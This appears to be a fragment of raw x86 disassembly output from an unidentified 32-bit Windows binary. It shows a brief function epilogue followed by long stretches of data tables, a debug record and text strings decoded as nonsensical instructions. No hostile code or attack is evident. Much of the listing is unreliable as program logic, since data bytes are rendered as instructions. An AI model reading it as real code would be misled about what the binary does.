  413b9d:	inc    ecx
  413b9e:	jl     0x413bd0
  413ba0:	xlat   BYTE PTR ds:[ebx]
  413ba1:	imul   esp,DWORD PTR ds:[edi-0x3a],0xb0dd0c
  413ba9:	icebp  
  413baa:	outs   dx,BYTE PTR ds:[esi]
  413bab:	xchg   edx,eax
  413bac:	rol    al,0x5
  413baf:	dec    eax
  413bb0:	aam    0x68
  413bb2:	push   ebx
  413bb3:	mov    edx,0xf0ef2094
  413bb8:	fwait
  413bb9:	add    al,0x7d
  413bbb:	cmp    eax,DWORD PTR [eax+0x284ad485]
  413bc1:	and    BYTE PTR [ecx],ch
  413bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bc4:	hlt    
  413bc5:	inc    edx
  413bc6:	(bad)  
  413bc7:	push   0x9954aa7c
  413bcc:	cmp    al,0x5d
  413bce:	or     eax,0xf008180c
  413bd3:	sbb    dh,bh
  413bd5:	mov    cl,BYTE PTR [ebp+0x4c]
  413bd8:	add    cl,BYTE PTR [ebx+0x52a0bb3c]
  413bde:	mov    al,ds:0x958af8ab
  413be3:	mov    ecx,DWORD PTR [ebp-0x8]
  413be6:	xor    ecx,eax
  413be8:	mov    eax,DWORD PTR [ebp+0x10]
  413beb:	add    ecx,esi
  413bed:	mov    DWORD PTR [eax],ecx
  413bef:	pop    edi
  413bf0:	pop    esi
  413bf1:	pop    ebx
  413bf2:	leave  
  413bf3:	ret    0xc
  413bf6:	jne    0x413c0b
  413bf8:	adc    BYTE PTR [eax],al
  413bfa:	std    
  413bfb:	push   ds
  413bfc:	adc    BYTE PTR [eax],al
  413bfe:	aas    
  413bff:	adc    BYTE PTR fs:[eax],al
  413c02:	sbb    cl,BYTE PTR [esi]
  413c04:	adc    BYTE PTR [eax],al
  413c06:	sbb    BYTE PTR [eax+0x10],dl
  413c09:	add    BYTE PTR [eax],ah
  413c0b:	push   es
  413c0c:	adc    BYTE PTR [eax],al
  413c0e:	out    dx,al
  413c0f:	jg     0x413c21
  413c11:	add    BYTE PTR [ebx],al
  413c13:	dec    edi
  413c14:	adc    BYTE PTR [eax],al
  413c16:	mov    esp,0x5500103b
  413c1b:	jns    0x413c2d
  413c1d:	add    BYTE PTR [edx],ch
  413c1f:	inc    eax
  413c20:	adc    BYTE PTR [eax],al
  413c22:	sbb    BYTE PTR ds:0x3d1c0041,bh
  413c28:	inc    ecx
  413c29:	add    BYTE PTR [eax],ah
  413c2b:	cmp    eax,0x3d240041
  413c30:	inc    ecx
  413c31:	add    BYTE PTR [eax],ch
  413c33:	cmp    eax,0x3d2c0041
  413c38:	inc    ecx
  413c39:	add    BYTE PTR [eax],dh
  413c3b:	cmp    eax,0x3d340041
  413c40:	inc    ecx
	...
  413c51:	add    BYTE PTR [eax],al
  413c53:	add    BYTE PTR [esi+0x4df185],bh
  413c59:	add    BYTE PTR [eax],al
  413c5b:	add    BYTE PTR [edx],al
  413c5d:	add    BYTE PTR [eax],al
  413c5f:	add    BYTE PTR [eax+0x0],dl
  413c62:	add    BYTE PTR [eax],al
  413c64:	inc    eax
  413c65:	cmp    eax,0x31400001
  413c6a:	add    DWORD PTR [eax],eax
  413c6c:	scas   al,BYTE PTR es:[edi]
  413c6d:	inc    ebp
  413c6e:	adc    BYTE PTR [eax],al
  413c70:	inc    esp
  413c71:	cmp    edx,DWORD PTR [eax]
  413c73:	add    BYTE PTR [edi+0x4e],bl
  413c76:	adc    BYTE PTR [eax],al
  413c78:	push   0x4b
  413c7a:	adc    BYTE PTR [eax],al
  413c7c:	cmp    edx,DWORD PTR fs:[eax]
  413c7f:	add    BYTE PTR [eax+0x43001057],bl
  413c85:	sbb    dl,BYTE PTR [eax]
  413c87:	add    BYTE PTR [esi+0x39],bl
  413c8a:	adc    BYTE PTR [eax],al
  413c8c:	idiv   BYTE PTR [ebx]
  413c8e:	inc    ecx
  413c8f:	add    dl,bh
  413c91:	cmp    eax,DWORD PTR [ecx+0x0]
  413c94:	(bad)  
  413c95:	cmp    eax,DWORD PTR [ecx+0x0]
  413c98:	add    bh,BYTE PTR [ecx+eax*2]
  413c9b:	add    BYTE PTR [esi],al
  413c9d:	cmp    al,0x41
  413c9f:	add    BYTE PTR [edx],cl
  413ca1:	cmp    al,0x41
  413ca3:	add    BYTE PTR [esi],cl
  413ca5:	cmp    al,0x41
  413ca7:	add    BYTE PTR [edx],dl
  413ca9:	cmp    al,0x41
  413cab:	add    BYTE PTR [esi],dl
  413cad:	cmp    al,0x41
  413caf:	add    BYTE PTR [edx],bl
  413cb1:	cmp    al,0x41
  413cb3:	add    BYTE PTR [esi],bl
  413cb5:	cmp    al,0x41
  413cb7:	add    al,bl
  413cb9:	cmp    al,0x41
  413cbb:	add    ah,bl
  413cbd:	cmp    al,0x41
  413cbf:	add    al,ah
  413cc1:	cmp    al,0x41
  413cc3:	add    ah,ah
  413cc5:	cmp    al,0x41
  413cc7:	add    al,ch
  413cc9:	cmp    al,0x41
  413ccb:	add    ah,ch
  413ccd:	cmp    al,0x41
  413ccf:	add    al,dh
  413cd1:	cmp    al,0x41
  413cd3:	add    ah,dh
  413cd5:	cmp    al,0x41
  413cd7:	add    BYTE PTR [ebp+0x16],ah
  413cda:	adc    BYTE PTR [eax],al
  413cdc:	sub    BYTE PTR [ecx+0x10],0x0
  413ce0:	cli    
  413ce1:	adc    BYTE PTR [bx+si],al
  413ce4:	sbb    BYTE PTR [ecx],al
  413ce6:	adc    BYTE PTR [eax],al
  413ce8:	pop    edi
  413ce9:	inc    esp
  413cea:	adc    BYTE PTR [eax],al
  413cec:	sbb    BYTE PTR [edx],ch
  413cee:	adc    BYTE PTR [eax],al
  413cf0:	in     eax,dx
  413cf1:	pop    ss
  413cf2:	adc    BYTE PTR [eax],al
  413cf4:	pop    esp
  413cf5:	sub    BYTE PTR [eax],dl
  413cf7:	add    BYTE PTR [esp+edi*1+0x41],ch
  413cfb:	add    BYTE PTR [eax+0x3c],dh
  413cfe:	inc    ecx
  413cff:	add    BYTE PTR [esp+edi*1+0x41],dh
  413d03:	add    BYTE PTR [eax+0x3c],bh
  413d06:	inc    ecx
  413d07:	add    BYTE PTR [esp+edi*1+0x41],bh
  413d0b:	add    BYTE PTR [eax-0x7bffbec4],al
  413d11:	cmp    al,0x41
  413d13:	add    BYTE PTR [eax-0x17ffbec4],cl
  413d19:	aaa    
  413d1a:	adc    BYTE PTR [eax],al
  413d1c:	cmp    DWORD PTR [esi],0x51e90010
  413d22:	adc    BYTE PTR [eax],al
  413d24:	push   cs
  413d25:	dec    eax
  413d26:	adc    BYTE PTR [eax],al
  413d28:	mov    ah,0x22
  413d2a:	adc    BYTE PTR [eax],al
  413d2c:	lock xor BYTE PTR [eax],dl
  413d2f:	add    BYTE PTR [edi+0x6b],ah
  413d32:	adc    BYTE PTR [eax],al
  413d34:	outs   dx,BYTE PTR ds:[esi]
  413d35:	or     eax,0x10
  413d3a:	add    BYTE PTR [eax],al
  413d3c:	add    BYTE PTR [eax],al
  413d3e:	add    BYTE PTR [eax],al
  413d40:	push   edx
  413d41:	push   ebx
  413d42:	inc    esp
  413d43:	push   ebx
  413d44:	inc    esp
  413d45:	xchg   DWORD PTR [ebx],esp
  413d47:	jmp    0x586:0x47299f73
  413d4e:	pushf  
  413d4f:	cmp    BYTE PTR [edi+0x73],dh
  413d52:	jbe    0x413da0
  413d54:	add    DWORD PTR [eax],eax
  413d56:	add    BYTE PTR [eax],al
  413d58:	inc    ebp
  413d59:	cmp    bl,BYTE PTR [ecx+ecx*2+0x6e]
  413d5d:	jae    0x413dd3
  413d5f:	popa   
  413d60:	ins    BYTE PTR es:[edi],dx
  413d61:	ins    BYTE PTR es:[edi],dx
  413d62:	and    BYTE PTR [eax+0x61],dl
  413d65:	je     0x413dcf
  413d67:	pop    esp
  413d68:	push   ebx
  413d69:	outs   dx,BYTE PTR gs:[esi]
  413d6b:	fs push ebx
  413d6d:	dec    ebp
  413d6e:	push   ebx
  413d6f:	pop    esp
  413d70:	dec    ebp
  413d71:	popa   
  413d72:	imul   ebp,DWORD PTR [esi+0x5c],0x46627553
  413d79:	outs   dx,DWORD PTR ds:[esi]
  413d7a:	ins    BYTE PTR es:[edi],dx
  413d7b:	fs gs jb 0x413ddb
  413d7f:	dec    ecx
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413d85:	gs jae 0x413de4
  413d88:	dec    ecx
  413d89:	outs   dx,BYTE PTR ds:[esi]
  413d8a:	outs   dx,WORD PTR ds:[esi]
  413d8c:	inc    ecx
  413d8d:	jo     0x413dff
  413d8f:	add    BYTE PTR [eax],al
  413d91:	add    BYTE PTR [eax],al
  413d93:	add    BYTE PTR [esi+0x4df185],bh
  413d99:	add    BYTE PTR [eax],al
  413d9b:	add    dl,al
  413d9d:	cmp    eax,0x10001
  413da2:	add    BYTE PTR [eax],al
  413da4:	add    DWORD PTR [eax],eax
  413da6:	add    BYTE PTR [eax],al
  413da8:	add    DWORD PTR [eax],eax
  413daa:	add    BYTE PTR [eax],al
  413dac:	mov    eax,0xbc00013d
  413db1:	cmp    eax,0x3dc00001
  413db6:	add    DWORD PTR [eax],eax
  413db8:	mov    ds:0xce000026,al
  413dbd:	cmp    eax,0x1
  413dc2:	push   ebx
  413dc3:	jns    0x413e32
  413dc5:	bound  ebp,QWORD PTR [edi+0x6c]
  413dc8:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  413dcf:	inc    ebx
  413dd0:	ins    BYTE PTR es:[edi],dx
  413dd1:	outs   dx,DWORD PTR ds:[esi]
  413dd2:	jae    0x413e39
  413dd4:	push   edi
  413dd5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  413ddc:	popa   
  413ddd:	je     0x413e48
  413ddf:	outs   dx,DWORD PTR ds:[esi]
  413de0:	outs   dx,BYTE PTR ds:[esi]
  413de1:	inc    ebx
  413de2:	ins    BYTE PTR es:[edi],dx
  413de3:	outs   dx,DWORD PTR ds:[esi]
  413de4:	jae    0x413e4b
  413de6:	push   edi
  413de7:	.byte 0x69
